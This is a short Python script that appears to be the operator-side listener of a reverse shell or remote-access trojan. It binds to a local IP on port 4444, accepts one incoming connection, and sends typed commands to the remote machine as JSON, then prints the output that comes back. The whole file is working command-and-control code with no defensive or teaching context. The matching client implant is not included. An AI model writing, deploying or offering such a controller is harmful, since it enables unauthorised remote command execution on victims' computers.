import socket
import json
import base64

def server(host, port):
    print("[+] Starting server...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    print(f"[+] Listening on {host}:{port}...")
    conn, addr = s.accept()
    print(f"[+] Connection established with {addr[0]}:{addr[1]}")
    return conn

def send(s, data):
    json_data = json.dumps(data)
    s.send(json_data.encode())

def receive(s):
    json_data = ""
    while True:
        try:
            json_data = json_data + s.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue

def run(s):
    while True:
        command = input("Enter command: ")
        send(s, {'command': command})
        if command == 'exit':
            break
        response = receive(s)
        print(response['output'])

s = server('192.168.0.102', 4444)
run(s)